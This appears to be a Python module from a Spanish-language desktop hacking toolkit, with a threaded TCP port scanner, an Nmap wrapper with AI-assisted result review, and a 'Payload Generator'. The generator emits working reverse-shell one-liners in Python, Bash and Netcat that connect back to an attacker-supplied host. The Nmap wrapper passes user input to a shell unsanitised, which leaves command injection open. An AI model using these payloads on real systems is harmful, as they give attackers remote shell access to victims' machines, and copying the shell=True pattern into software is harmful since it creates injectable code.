import customtkinter as ctk
import socket
import subprocess
import threading
import time
import struct
import ipaddress

from .base_module import BaseModule
from .shared import ToolFrameContainer


class HackingModule(BaseModule):
    name = "Port Scanner"
    icon = "🌐"
    description = "Escáner de puertos TCP con detección de servicios"

    def build(self, parent):
        colors = self.colors
        self._build_tool_cards(parent, [
            ("Port Scanner", "Escaneo TCP con detección de servicios", self.port_scanner, "🌐"),
            ("Payload Generator", "Generador de payloads reversos", self.payload_gen, "⚡"),
            ("Nmap GUI", "Interfaz para Nmap externo", self.nmap_gui, "🗺️"),
        ])

    # ── Enhanced Port Scanner ────────────────────────────────────────

    def port_scanner(self):
        app = self.app
        app.clear_content()
        win = ToolFrameContainer(app.content_frame, "Port Scanner", self.build, self.colors)
        win.pack(fill="both", expand=True)

        main_row = ctk.CTkFrame(win, fg_color="transparent")
        main_row.pack(fill="both", expand=True, padx=15, pady=10)

        # Left: controls
        left = ctk.CTkFrame(main_row, fg_color="transparent")
        left.pack(side="left", fill="y", padx=(0, 10))

        ctk.CTkLabel(left, text="Target (IP o dominio):",
                     font=("Arial", 10), text_color=self.colors["text_secondary"]).pack(anchor="w")
        target_entry = ctk.CTkEntry(left, width=280, placeholder_text="ej: 192.168.1.1")
        target_entry.pack(fill="x", pady=(2, 8))

        ctk.CTkLabel(left, text="Puertos:",
                     font=("Arial", 10), text_color=self.colors["text_secondary"]).pack(anchor="w")
        port_entry = ctk.CTkEntry(left, width=280, placeholder_text="ej: 1-1000 o 22,80,443")
        port_entry.pack(fill="x", pady=(2, 8))

        ctk.CTkLabel(left, text="Timeout (segundos):",
                     font=("Arial", 10), text_color=self.colors["text_secondary"]).pack(anchor="w")
        timeout_var = ctk.StringVar(value="1.5")
        ctk.CTkEntry(left, width=80, textvariable=timeout_var).pack(anchor="w", pady=(2, 8))

        profile_frame = ctk.CTkFrame(left, fg_color="transparent")
        profile_frame.pack(fill="x", pady=4)

        def set_quick():
            port_entry.delete(0, "end")
            port_entry.insert(0, "21,22,23,25,53,80,110,143,443,445,993,995,1433,1521,3306,3389,5432,5900,8080,8443,27017")
            timeout_var.set("0.8")

        def set_normal():
            port_entry.delete(0, "end")
            port_entry.insert(0, "1-10000")
            timeout_var.set("1.5")

        def set_deep():
            port_entry.delete(0, "end")
            port_entry.insert(0, "1-65535")
            timeout_var.set("3.0")

        ctk.CTkButton(profile_frame, text="Rápido", command=set_quick,
                      fg_color=self.colors["hover"], text_color=self.colors["text"],
                      width=65, height=28, font=("Arial", 9)).pack(side="left", padx=2)
        ctk.CTkButton(profile_frame, text="Normal", command=set_normal,
                      fg_color=self.colors["hover"], text_color=self.colors["text"],
                      width=65, height=28, font=("Arial", 9)).pack(side="left", padx=2)
        ctk.CTkButton(profile_frame, text="Profundo", command=set_deep,
                      fg_color=self.colors["hover"], text_color=self.colors["text"],
                      width=65, height=28, font=("Arial", 9)).pack(side="left", padx=2)

        ctk.CTkLabel(left, text="Hilos simultáneos:",
                     font=("Arial", 10), text_color=self.colors["text_secondary"]).pack(anchor="w", pady=(8, 2))
        threads_var = ctk.StringVar(value="100")
        ctk.CTkEntry(left, width=80, textvariable=threads_var).pack(anchor="w")

        status_label = ctk.CTkLabel(left, text="", font=("Arial", 10),
                                    text_color=self.colors["text_secondary"])
        status_label.pack(anchor="w", pady=4)
        progress = ctk.CTkProgressBar(left, progress_color=self.colors["accent"])
        progress.pack(fill="x", pady=4)
        progress.set(0)

        btn_row = ctk.CTkFrame(left, fg_color="transparent")
        btn_row.pack(fill="x", pady=6)
        scan_btn = ctk.CTkButton(btn_row, text="Escanear", fg_color=self.colors["accent"],
                                 width=120, height=32)
        scan_btn.pack(side="left", padx=2)
        cancel_btn = ctk.CTkButton(btn_row, text="Cancelar", fg_color=self.colors["hover"],
                                   text_color=self.colors["text"], width=90, height=32)
        cancel_btn.pack(side="left", padx=2)

        # Right: results
        right = ctk.CTkFrame(main_row, fg_color="transparent")
        right.pack(side="right", fill="both", expand=True)

        result_tabs = ctk.CTkTabview(right, fg_color=self.colors["fg"])
        result_tabs.pack(fill="both", expand=True)
        tab_open = result_tabs.add("Puertos Abiertos")
        tab_all = result_tabs.add("Log Completo")
        tab_details = result_tabs.add("Detalles")

        open_frame = ctk.CTkScrollableFrame(tab_open, fg_color="transparent")
        open_frame.pack(fill="both", expand=True, padx=5, pady=5)

        log_text = ctk.CTkTextbox(tab_all, fg_color=self.colors["bg"],
                                  text_color=self.colors["text"], font=("Consolas", 11))
        log_text.pack(fill="both", expand=True, padx=5, pady=5)

        detail_text = ctk.CTkTextbox(tab_details, fg_color=self.colors["bg"],
                                     text_color=self.colors["text"], font=("Consolas", 10))
        detail_text.pack(fill="both", expand=True, padx=5, pady=5)

        scan_state = {"proc_id": None, "running": False}

        def log(msg):
            app.after(0, lambda: log_text.winfo_exists() and log_text.insert("end", msg + "\n"))

        def _scan_port(ip, port, timeout):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                t0 = time.time()
                result = sock.connect_ex((ip, port))
                elapsed = time.time() - t0
                if result == 0:
                    banner = b""
                    try:
                        sock.settimeout(1.0)
                        banner = sock.recv(1024).strip()
                    except Exception:
                        pass
                    sock.close()
                    service = _guess_service(port, banner)
                    return {"port": port, "state": "open", "banner": banner,
                            "service": service, "latency_ms": int(elapsed * 1000)}
                sock.close()
                return {"port": port, "state": "closed", "banner": b"", "service": ""}
            except Exception:
                return {"port": port, "state": "error", "banner": b"", "service": ""}

        def _guess_service(port, banner):
            common = {21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
                      80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS", 445: "SMB",
                      993: "IMAPS", 995: "POP3S", 1433: "MSSQL", 1521: "Oracle",
                      3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL", 5900: "VNC",
                      8080: "HTTP-Proxy", 8443: "HTTPS-Alt", 27017: "MongoDB"}
            if banner:
                text = banner.decode("utf-8", errors="replace").strip()
                if text:
                    return text[:60]
            return common.get(port, "")

        def start_scan():
            ip = target_entry.get().strip()
            port_str = port_entry.get().strip()
            if not ip or not port_str:
                app.toast.show("Completa target y puertos", type="error")
                return
            try:
                timeout = float(timeout_var.get())
            except ValueError:
                timeout = 1.5
            try:
                max_threads = min(500, max(1, int(threads_var.get())))
            except ValueError:
                max_threads = 100

            # Resolve hostname
            try:
                ipaddress.ip_address(ip)
            except ValueError:
                try:
                    ip = socket.gethostbyname(ip)
                    log(f"[*] Resuelto: {ip}")
                except socket.gaierror:
                    app.toast.show(f"No se pudo resolver {ip}", type="error")
                    return

            # Parse ports
            ports = []
            try:
                if '-' in port_str:
                    parts = port_str.split('-')
                    start, end = int(parts[0]), int(parts[1])
                    ports = list(range(start, min(end + 1, 65536)))
                elif ',' in port_str:
                    ports = [int(p.strip()) for p in port_str.split(',') if p.strip()]
                else:
                    ports = [int(port_str)]
            except ValueError:
                app.toast.show("Rango de puertos inválido", type="error")
                return

            ports = [p for p in ports if 1 <= p <= 65535]
            if not ports:
                app.toast.show("Sin puertos válidos", type="error")
                return

            scan_state["running"] = True
            scan_btn.configure(state="disabled")
            cancel_btn.configure(state="normal")

            # Clear previous results
            for w in open_frame.winfo_children():
                w.destroy()
            log_text.delete("1.0", "end")
            detail_text.delete("1.0", "end")
            progress.set(0)
            status_label.configure(text=f"Escaneando {len(ports)} puertos en {ip}...")

            total = len(ports)
            results = []
            lock = threading.Lock()
            cancelled = threading.Event()

            def cancel():
                cancelled.set()
                scan_state["running"] = False
                cancel_btn.configure(state="disabled")
                status_label.configure(text="Cancelado")
                log("[!] Escaneo cancelado")

            cancel_btn.configure(command=cancel)

            def worker(port_list):
                for port in port_list:
                    if cancelled.is_set():
                        return
                    r = _scan_port(ip, port, timeout)
                    with lock:
                        results.append(r)
                        done = len(results)
                    pct = done / total * 100
                    app.after(0, lambda v=pct/100: progress.set(v))
                    if done % 50 == 0 or done == total:
                        app.after(0, lambda d=done, t=total: status_label.configure(
                            text=f"Progreso: {d}/{t} ({int(d/t*100)}%)"))
                    if r["state"] == "open":
                        app.after(0, lambda r=r: _add_open_result(r))
                        log(f"  [+] Puerto {r['port']:5d} - ABIERTO - {r['service']}")
                    if done % 100 == 0 and done == len(results):
                        pass
                if not cancelled.is_set():
                    app.after(0, lambda: _finish_scan(ip))

            def _add_open_result(r):
                card = ctk.CTkFrame(open_frame, fg_color=self.colors["bg"], corner_radius=6)
                card.pack(fill="x", pady=2, padx=2)
                row = ctk.CTkFrame(card, fg_color="transparent")
                row.pack(fill="x", padx=10, pady=4)
                ctk.CTkLabel(row, text=f"Puerto {r['port']}", font=("Arial", 12, "bold"),
                             text_color=self.colors["accent"]).pack(side="left")
                ctk.CTkLabel(row, text=f" {r['service']}" if r["service"] else "",
                             font=("Arial", 11), text_color=self.colors["text"]).pack(side="left", padx=8)
                ctk.CTkLabel(row, text=f"{r['latency_ms']}ms",
                             font=("Arial", 9), text_color=self.colors["text_secondary"]).pack(side="right")
                if r.get("banner"):
                    ctk.CTkLabel(card, text=f"Banner: {r['banner'][:80].decode('utf-8','replace')}",
                                 font=("Consolas", 9), text_color=self.colors["text_secondary"],
                                 anchor="w").pack(fill="x", padx=10, pady=(0, 4))

            def _finish_scan(target_ip):
                scan_state["running"] = False
                scan_btn.configure(state="normal")
                cancel_btn.configure(state="disabled")
                opens = [r for r in results if r["state"] == "open"]
                status_label.configure(text=f"Completado: {len(opens)} puertos abiertos de {len(ports)}")
                progress.set(1.0)
                log(f"\n[*] Escaneo completado en {target_ip}")
                log(f"[*] Puertos abiertos: {len(opens)}")

                # Details
                detail_text.insert("end", f"Target: {target_ip}\n")
                detail_text.insert("end", f"Puertos escaneados: {len(ports)}\n")
                detail_text.insert("end", f"Puertos abiertos: {len(opens)}\n")
                detail_text.insert("end", f"Timeout: {timeout}s\n")
                detail_text.insert("end", f"Hilos: {max_threads}\n\n")
                for r in sorted(opens, key=lambda x: x["port"]):
                    banner_str = r['banner'].decode('utf-8', 'replace')[:80] if r.get('banner') else ""
                    detail_text.insert("end", f"  {r['port']:5d}/tcp  open  {r['service']:20s}  {r['latency_ms']}ms  {banner_str}\n")

                # Notification on completion
                if opens:
                    app.notify(
                        f"Escaneo completado: {len(opens)} puertos abiertos",
                        f"En {target_ip}: {', '.join(str(r['port']) for r in opens[:5])}",
                        category="security", priority="high" if len(opens) > 3 else "normal",
                        source="port_scanner"
                    )

            # Distribute ports among threads
            chunk_size = max(1, len(ports) // max_threads)
            chunks = [ports[i:i + chunk_size] for i in range(0, len(ports), chunk_size)]
            for chunk in chunks:
                t = threading.Thread(target=worker, args=(chunk,), daemon=True)
                t.start()

            log(f"[*] Iniciando escaneo de {len(ports)} puertos en {ip}")
            log(f"[*] Timeout: {timeout}s, Hilos: {len(chunks)}")
            log("[*] Puertos abiertos:")

        scan_btn.configure(command=start_scan)
        cancel_btn.configure(state="disabled")

    # ── Payload Generator ────────────────────────────────────────────

    def payload_gen(self):
        app = self.app
        app.clear_content()
        win = ToolFrameContainer(app.content_frame, "Payload Generator", self.build, self.colors)
        win.pack(fill="both", expand=True)

        main = ctk.CTkFrame(win, fg_color="transparent")
        main.pack(fill="both", expand=True, padx=20, pady=10)

        ctk.CTkLabel(main, text="LHOST (IP atacante):",
                     font=("Arial", 10), text_color=self.colors["text_secondary"]).pack(anchor="w")
        lhost = ctk.CTkEntry(main, width=300, placeholder_text="IP del atacante")
        lhost.pack(fill="x", pady=(2, 8))

        ctk.CTkLabel(main, text="LPORT:", font=("Arial", 10), text_color=self.colors["text_secondary"]).pack(anchor="w")
        lport = ctk.CTkEntry(main, width=120, placeholder_text="4444")
        lport.pack(anchor="w", pady=(2, 8))

        lang_frame = ctk.CTkFrame(main, fg_color="transparent")
        lang_frame.pack(fill="x", pady=4)
        lang_var = ctk.StringVar(value="python")
        for lang, label in [("python", "Python"), ("bash", "Bash"), ("nc", "Netcat")]:
            ctk.CTkRadioButton(lang_frame, text=label, variable=lang_var, value=lang,
                               fg_color=self.colors["accent"], text_color=self.colors["text"]).pack(side="left", padx=6)

        output = ctk.CTkTextbox(main, height=280, fg_color=self.colors["bg"],
                                text_color=self.colors["text"], font=("Consolas", 11))
        output.pack(fill="both", expand=True, pady=10)

        def generate():
            host = lhost.get().strip()
            port = lport.get().strip()
            if not host or not port:
                app.toast.show("Completa LHOST y LPORT", type="error")
                return
            lang = lang_var.get()
            payloads = {
                "python": (
                    f"import socket,subprocess,os\n"
                    f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
                    f"s.connect(('{host}',{port}))\n"
                    f"os.dup2(s.fileno(),0)\n"
                    f"os.dup2(s.fileno(),1)\n"
                    f"os.dup2(s.fileno(),2)\n"
                    f"subprocess.call(['/bin/sh','-i'])"
                ),
                "bash": f"bash -i >& /dev/tcp/{host}/{port} 0>&1",
                "nc": f"nc -e /bin/sh {host} {port}",
            }
            output.delete("1.0", "end")
            output.insert("1.0", payloads.get(lang, ""))
            app.toast.show("Payload generado", type="success")

        ctk.CTkButton(main, text="Generar Payload", command=generate,
                      fg_color=self.colors["accent"], width=160, height=32).pack(pady=5)

    # ── Nmap GUI ─────────────────────────────────────────────────────

    def nmap_gui(self):
        app = self.app
        app.clear_content()
        win = ToolFrameContainer(app.content_frame, "Nmap Scanner", self.build, self.colors)
        win.pack(fill="both", expand=True)

        ctk.CTkLabel(win, text="Target (IP o dominio):",
                     font=("Arial", 10), text_color=self.colors["text_secondary"]).pack(anchor="w", padx=20)

        target = ctk.CTkEntry(win, width=400, placeholder_text="ej: scanme.nmap.org")
        target.pack(pady=5, padx=20, fill="x")

        flags = ctk.CTkEntry(win, width=400, placeholder_text="Flags Nmap (ej: -sV -sC)")
        flags.pack(pady=5, padx=20, fill="x")
        flags.insert(0, "-sV")

        progress = ctk.CTkProgressBar(win, progress_color=self.colors["accent"])
        progress.pack(fill="x", padx=20, pady=5)
        progress.set(0)

        output = ctk.CTkTextbox(win, height=250, fg_color=self.colors["bg"],
                                text_color=self.colors["text"], font=("Consolas", 11))
        output.pack(pady=10, padx=20, fill="both", expand=True)

        def scan():
            ip = target.get().strip()
            flag_str = flags.get().strip() or "-sV"
            if not ip:
                app.toast.show("Ingresa un target", type="error")
                return
            output.delete("1.0", "end")
            output.insert("end", f"Iniciando nmap {flag_str} {ip}...\n")
            progress.set(0.1)

            def run():
                try:
                    app.after(0, lambda: progress.set(0.4))
                    cmd = f"nmap {flag_str} {ip}"
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=120)
                    app.after(0, lambda: progress.set(1.0))
                    app.after(0, lambda: output.insert("end", result.stdout or result.stderr))
                    if result.stdout:
                        app.notify(f"Nmap completado: {ip}", "Resultados listos",
                                   category="network", priority="normal", source="nmap")
                except subprocess.TimeoutExpired:
                    app.after(0, lambda: output.insert("end", "\n[!] Timeout: Nmap tardó demasiado"))
                except FileNotFoundError:
                    app.after(0, lambda: output.insert("end", "\n[!] Nmap no está instalado"))
                except Exception as e:
                    app.after(0, lambda: output.insert("end", f"\n[!] Error: {e}"))

            threading.Thread(target=run, daemon=True).start()

        btn_frame = ctk.CTkFrame(win, fg_color="transparent")
        btn_frame.pack(pady=8)

        ctk.CTkButton(btn_frame, text="Escanear", command=scan,
                      fg_color=self.colors["accent"], width=140, height=32).pack(side="left", padx=5)
        ctk.CTkButton(btn_frame, text="Auditar con IA", command=lambda: self._nmap_ai_audit(output),
                      fg_color=self.colors["accent_light"], width=140, height=32).pack(side="left", padx=5)

    def _nmap_ai_audit(self, output_box):
        app = self.app
        text = output_box.get("1.0", "end-1c").strip()
        if not text or "Iniciando" in text or "Error" in text or "instalado" in text:
            app.toast.show("No hay resultados de Nmap", type="error")
            return
        app.toast.show("Analizando con IA...", type="info")
        output_box.delete("1.0", "end")
        output_box.insert("1.0", "Analizando resultados...\n\n")

        def run():
            prompt = f"Analiza estos resultados de Nmap buscando vulnerabilidades y puertos de riesgo. Responde en español:\n\n{text}"
            response = app.ollama.generate(prompt)
            app.after(0, lambda: output_box.winfo_exists() and (
                output_box.delete("1.0", "end") or output_box.insert("1.0", response or "Sin respuesta")))
            app.after(0, lambda: app.toast.show("Análisis completado", type="success"))

        threading.Thread(target=run, daemon=True).start()
